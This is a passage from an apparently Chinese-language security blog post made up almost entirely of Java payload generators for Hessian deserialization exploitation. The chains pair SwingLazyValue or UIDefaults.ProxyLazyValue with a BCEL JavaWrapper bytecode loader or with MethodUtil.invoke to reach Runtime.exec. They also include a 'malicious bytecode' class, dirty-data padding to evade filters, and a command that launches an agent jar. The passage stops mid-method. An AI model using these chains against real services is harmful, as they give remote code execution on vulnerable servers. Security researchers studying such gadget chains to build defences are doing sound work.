<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> org.example.HashColl;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hessian3_bcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(clazz.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>,<span class="string">&quot;_main&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;payload&#125;&#125;);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">u1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">u2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        u1.put(<span class="string">&quot;aaa&quot;</span>, swingLazyValue);</span><br><span class="line">        u2.put(<span class="string">&quot;aaa&quot;</span>, swingLazyValue);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> HashColl.makeMap(u1, u2);</span><br><span class="line">        <span class="comment">//hessian序列</span></span><br><span class="line">        hessian2Serialize(map);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hessian2Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//ByteArrayOutputStream bao = new ByteArrayOutputStream();</span></span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;hessian_bcel2.ser&quot;</span>));</span><br><span class="line">        output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        output.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">恶意字节码</span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">额外加了部分脏数据</span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.example.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashColl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span><span class="params">(Object v1, Object v2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">putValMethod</span> <span class="operator">=</span> HashMap.class.getDeclaredMethod(<span class="string">&quot;putVal&quot;</span>, <span class="type">int</span>.class, Object.class, Object.class, <span class="type">boolean</span>.class, <span class="type">boolean</span>.class);</span><br><span class="line">        putValMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        putValMethod.invoke(map, <span class="number">0</span>, v1, <span class="number">123</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">        putValMethod.invoke(map, <span class="number">1</span>, v2, <span class="number">123</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMapOriginal</span><span class="params">(Object v1, Object v2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">3</span>);</span><br><span class="line">        Hashtable&lt;Object, Object&gt; dummy = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            dummy.put(getLongString(<span class="number">20</span>) + i, getLongString(<span class="number">15000</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, dummy, dummy, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">2</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">unhash</span><span class="params">(<span class="type">int</span> hash)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> hash;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">answer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">if</span> (target &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span></span><br><span class="line">            answer.append(<span class="string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (target == Integer.MIN_VALUE)</span><br><span class="line">                <span class="keyword">return</span> answer.toString();</span><br><span class="line">            <span class="comment">// Find target without sign bit set</span></span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        unhash0(answer, target);</span><br><span class="line">        <span class="keyword">return</span> answer.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unhash0</span><span class="params">(StringBuilder partial, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">div</span> <span class="operator">=</span> target / <span class="number">31</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rem</span> <span class="operator">=</span> target % <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (div &lt;= Character.MAX_VALUE) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( div != <span class="number">0</span> )</span><br><span class="line">                partial.append((<span class="type">char</span>) div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            unhash0(partial, div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getLongString</span><span class="params">(<span class="type">int</span> length)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">            str += <span class="string">&quot;x&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>只能在4.x运行,本地4.0.38可以运行，，，3.x版本的命令执行可以参考<a target="_blank" rel="noopener" href="https://flowerwind.github.io/2023/04/17/%E8%AE%B0%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98hessian%E4%B8%8D%E5%87%BA%E7%BD%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-md/">https://flowerwind.github.io/2023/04/17/%E8%AE%B0%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98hessian%E4%B8%8D%E5%87%BA%E7%BD%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-md/</a> 通过fastjson来执行linux命令</p>
<p>UIDefaults.ProxyLazyValue+sun.reflect.misc.MethodUtil</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.misc.MethodUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Command_exec</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">invoke</span> <span class="operator">=</span> MethodUtil.class.getMethod(<span class="string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(</span><br><span class="line">                <span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>,</span><br><span class="line">                <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;invoke, <span class="keyword">new</span> <span class="title class_">Object</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;&#125;&#125;);</span><br><span class="line">        Reflections.setFieldValue(swingLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Object[] keyValueList = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;abc&quot;</span>, swingLazyValue&#125;;</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable1 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable2 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">        hashtable1.put(<span class="string">&quot;a&quot;</span>, uiDefaults1);</span><br><span class="line">        hashtable2.put(<span class="string">&quot;a&quot;</span>, uiDefaults2);</span><br><span class="line">        <span class="comment">//hessian序列</span></span><br><span class="line">        serObj(hashtable1, hashtable2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serObj</span><span class="params">(Object u1, Object u2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">node</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> node.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, node);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node1</span> <span class="operator">=</span> constructor.newInstance(<span class="number">0</span>, u1, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node2</span> <span class="operator">=</span> constructor.newInstance(<span class="number">0</span>, u2, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node1, u1);</span><br><span class="line">        key.set(node2, u2);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(hashMap, <span class="number">2</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">arr</span> <span class="operator">=</span> Array.newInstance(node, <span class="number">2</span>);</span><br><span class="line">        Array.set(arr, <span class="number">0</span>, node1);</span><br><span class="line">        Array.set(arr, <span class="number">1</span>, node2);</span><br><span class="line">        table.set(hashMap, arr);</span><br><span class="line"><span class="comment">/*        Hessian2Output hessian2Output = new Hessian2Output(new FileOutputStream(&quot;hessian.ser&quot;));</span></span><br><span class="line"><span class="comment">        hessian2Output.setSerializerFactory(new SerializerFactory());</span></span><br><span class="line"><span class="comment">        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);</span></span><br><span class="line"><span class="comment">        hessian2Output.writeObject(hashMap);</span></span><br><span class="line"><span class="comment">        hessian2Output.flush();</span></span><br><span class="line"><span class="comment">        hessian2Output.close();*/</span></span><br><span class="line">        output.writeObject(hashMap);</span><br><span class="line">        output.flushBuffer();</span><br><span class="line">        <span class="type">byte</span>[] result = baos.toByteArray();</span><br><span class="line">        Files.write(Paths.get(<span class="string">&quot;xx.ser&quot;</span>),result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SwingLazyValue+MethodUtil</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String[] arg = &#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">invokeMethod</span> <span class="operator">=</span></span><br><span class="line">                Class.forName(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>)</span><br><span class="line">                        .getDeclaredMethod(<span class="string">&quot;invoke&quot;</span>, Method.class,</span><br><span class="line">                                Object.class, Object[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span></span><br><span class="line">                Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        String.class);</span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">slz</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        invokeMethod,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>(),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, Runtime.getRuntime(), <span class="keyword">new</span></span><br><span class="line">                                <span class="title class_">Object</span>[]&#123;<span class="string">&quot;java -jar E:\\打点\\java打点\\agent\\agent_for_windows_v1.jar --pid all&quot;</span>&#125;&#125;</span><br><span class="line">                &#125;);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults1.put(<span class="string">&quot;_&quot;</span>, slz);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults2.put(<span class="string">&quot;_&quot;</span>, slz);</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> s.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(s, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; nodeCons =</span><br><span class="line">                nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class,</span><br><span class="line">                        nodeC);</span><br><span class="line">        